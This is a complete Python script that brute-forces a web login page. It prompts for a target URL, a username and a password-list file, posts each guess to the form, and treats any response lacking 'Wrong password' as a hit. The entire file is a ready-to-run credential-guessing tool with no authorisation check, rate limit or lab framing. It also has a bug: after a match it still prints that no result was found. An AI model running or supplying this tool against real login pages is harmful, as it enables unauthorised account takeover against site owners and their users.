import requests
from colorama import init, Fore, Back, Style

init(autoreset=True)

def brute_force_login(target_url, username, password_list_path):
    try:
    
        with open(password_list_path, "r") as file:
            passwords = file.readlines()
        print(f"[+] Number of passwords in the list: {len(passwords)}")
        for password in passwords:
            password = password.strip()
            print(f"{Fore.CYAN}[INFO]{Fore.RESET} Testing: {username} / {password}")
            
            data = {
                "username": username,
                "password": password,
                "submit": "Login"
            }

            response = requests.post(
                target_url,
                data=data,
                allow_redirects=True
            )

            
            if "Wrong password" not in response.text:
                print(f"{Fore.GREEN}[+]Password Found UserName{Fore.RESET} : {username}/ Password : {password}")
                break
    
            elif response.status_code == 200:
                print(f"{Fore.RED}[-]Pass Not Found{Fore.RESET} :{username}/Password :{password}")

        print("[!] All passwords were tested; no result was found.")

    except FileNotFoundError:
        print("[!] Password list file not found.")

    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    target_url = input("Enter the target login page URL: ")
    username = input("Enter the username: ")
    password_list_path = input("Enter the password list file path: ")

    print("\n[+] Starting brute-force test...")
    brute_force_login(
        target_url,
        username,
        password_list_path
    )
